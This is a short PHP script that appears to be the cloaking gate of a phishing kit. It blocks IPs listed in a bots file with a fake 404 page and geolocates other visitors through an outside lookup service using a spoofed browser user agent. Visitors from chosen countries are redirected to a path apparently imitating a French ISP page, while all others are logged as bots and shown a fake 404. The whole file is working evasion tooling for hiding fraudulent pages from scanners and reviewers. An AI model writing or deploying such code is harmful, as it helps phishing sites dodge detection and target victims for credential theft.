<?php
error_reporting(E_ALL);
set_time_limit(0);
include("allowed.php");
include("func.php");
$bots = "bots.txt";
$lines = file($bots, FILE_IGNORE_NEW_LINES);
$found = false;
foreach ($lines as $line){
    if (strpos($ip,$line) !== false){
        $found = true;
        break;
    }
}
if ($found){
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}else{
	$url="http://extreme-ip-lookup.com/json/$ip";
	$ch = curl_init(); 
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
	curl_setopt($ch, CURLOPT_TIMEOUT, 0);
	curl_setopt	($ch, CURLOPT_HEADER, 0);    
	curl_setopt	($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt	($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_REFERER, $url);
	// curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt	($ch, CURLOPT_URL, $url);
	$getinfo = curl_exec($ch);
	// echo $getinfo;
	$getinfo = json_decode($getinfo,true);
	// echo $getinfo;
	$country_code = $getinfo[countryCode];
	if ( in_array($country_code, $country)){
            header("location:/modal/free/fr/www/");
		}else { header('HTTP/1.0 404 Not Found');
		file_put_contents($bots,"$ip\r\n",FILE_APPEND);
		echo $getinfo;
				die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
		}
}
?>

